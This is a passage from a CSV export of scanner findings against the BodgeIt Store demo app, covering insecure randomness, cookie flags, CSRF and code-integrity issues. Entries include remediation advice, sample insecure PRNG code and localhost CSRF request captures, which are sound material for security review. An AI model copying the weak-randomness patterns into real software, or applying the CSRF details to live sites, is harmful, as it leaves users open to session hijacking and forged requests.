uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","251","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/js/encryption.js","","","http://localhost/root/js/encryption.js","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> function genReceiptURL (baseURL){ var randNum = Math.random(); var receiptURL = baseURL + randNum + "".html""; return receiptURL; } </pre> This code uses the <code>Math.random()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Math.random()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) In JavaScript, the typical recommendation is to use the <code>window.crypto.random()</code> function in the Mozilla API. However, this method does not work in many browsers, including more recent versions of Mozilla Firefox. There is currently no cross-browser solution for a robust cryptographic PRNG. In the meantime, consider handling any PRNG functionality outside of JavaScript.</Content>","","",""
"DemoApps","","Bodgeit","139","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/js/jquery-1.6.4.min.js","","","http://localhost/root/js/jquery-1.6.4.min.js","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> function genReceiptURL (baseURL){ var randNum = Math.random(); var receiptURL = baseURL + randNum + "".html""; return receiptURL; } </pre> This code uses the <code>Math.random()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Math.random()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) In JavaScript, the typical recommendation is to use the <code>window.crypto.random()</code> function in the Mozilla API. However, this method does not work in many browsers, including more recent versions of Mozilla Firefox. There is currently no cross-browser solution for a robust cryptographic PRNG. In the meantime, consider handling any PRNG functionality outside of JavaScript.</Content>","","",""
"DemoApps","","Bodgeit","337","HttpOnlyCookies_In_Config","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/build/WEB-INF/web.xml","","","http://localhost/bodgeit/build/WEB-INF/web.xml","","","","","","","",""
"DemoApps","","Bodgeit","293","HttpOnlyCookies","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","485","HttpOnlyCookies","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","460","HttpOnlyCookies","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","489","HttpOnlyCookies","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","307","HttpOnlyCookies","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","619","HttpOnlyCookies","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","538","HttpOnlyCookies_In_Config","","Medium","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/WEB-INF/web.xml","","","http://localhost/bodgeit/root/WEB-INF/web.xml","","","","","","","",""
"DemoApps","","Bodgeit","48","Cross-site request forgery","","Medium","Open","2015-10-15","Burp Suite Pro,Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/basket.jsp","","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://UZGdX.com:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 34 Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2 quantity_28=1&update=Update+Basket","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3286 Date: Mon, 28 Mar 2016 20:11:13 GMT Connection: close <script type=""text/javascript""> function incQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = --q.value; if (val < 0) { val = 0; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Basket</h3> <p style=""color:green"">Your basket had been updated.</p><br/> <form action=""basket.jsp"" method=""post""> <table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Quantity</th><th>Price</th><th>Total</th></tr> <tr> <td><a href=""product.jsp?prodid=28"">Bonzo dog doo dah</a></td> <td style=""text-align: center"">&nbsp;<a href=""#"" onclick=""decQuantity(28);""><img src=""images/130.png"" alt=""Decrease quantity in basket"" border=""0""></a>&nbsp;<input id=""quantity_28"" name=""quantity_28"" value=""1"" maxlength=""2"" size = ""2"" style=""text-align: right"" READONLY />&nbsp;<a href=""#"" onclick=""incQuantity(28);""><img src=""images/129.png"" alt=""Increase quantity in basket"" border=""0""></a>&nbsp;</td> <td align=""right"">$2.45</td> </td><td align=""right"">$2.45</td> </tr> <tr><td>Total</td><td style=""text-align: center""><input id=""update"" name=""update"" type=""submit"" value=""Update Basket""/></td><td>&nbsp;</td><td align=""right"">$2.45</td></tr> </table> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against unauthenticated functionality. This is unlikely to constitute a security vulnerability in its own right, however it may facilitate exploitation of other vulnerabilities affecting application users. Issue Background: <p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p> <ul> <li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li> <li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li> <li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>","<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p> <p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>","","",""
"DemoApps","","Bodgeit","12","Cross-site request forgery","","Medium","Open","2015-10-15","Burp Suite Pro,Fortify SCA,WebInspect","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/contact.jsp","","","http://localhost:8080/bodgeit/contact.jsp","","POST /bodgeit/contact.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://zlBpO.com:8080/bodgeit/contact.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 5 Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2 null=","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2344 Date: Mon, 28 Mar 2016 20:11:27 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Contact Us</h3> Please send us your feedback: <br/><br/> <form method=""POST""> <input type=""hidden"" id=""user"" name=""null"" value=""""/> <input type=""hidden"" id=""anticsrf"" name=""anticsrf"" value=""0.39070315050048565""></input> <center> <table> <tr> <td><textarea id=""comments"" name=""comments"" cols=80 rows=8></textarea></td> </tr> <tr> <td><input id=""submit"" type=""submit"" value=""Submit""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against unauthenticated functionality. This is unlikely to constitute a security vulnerability in its own right, however it may facilitate exploitation of other vulnerabilities affecting application users.<br><br>The original request contains parameters that look like they may be anti-CSRF tokens. However the request is successful if these parameters are removed. Issue Background: <p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p> <ul> <li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li> <li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li> <li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>","<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p> <p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>","","",""
"DemoApps","","Bodgeit","583","Client_DOM_XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","433","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","477","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","550","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","662","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","404","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/basket.jsp","quantity","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","427","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/basket.jsp","quantity","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","413","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","434","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","455","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","461","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","571","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","597","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","600","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","614","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","618","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","654","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","658","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","595","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/password.jsp","password1","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","358","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","409","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","494","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","664","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","327","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","370","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","426","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","431","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","510","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","530","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","539","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","547","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","561","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","652","XSRF","","Medium","Open","2015-10-15","Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","635","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","353","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","548","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","610","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","377","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/dbconnection.jspf","","","http://localhost/bodgeit/root/dbconnection.jspf","","","","","","","",""
"DemoApps","","Bodgeit","354","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/header.jsp","","","http://localhost/bodgeit/root/header.jsp","","","","","","","",""
"DemoApps","","Bodgeit","299","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","667","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","315","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","457","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/password.jsp","","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","644","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
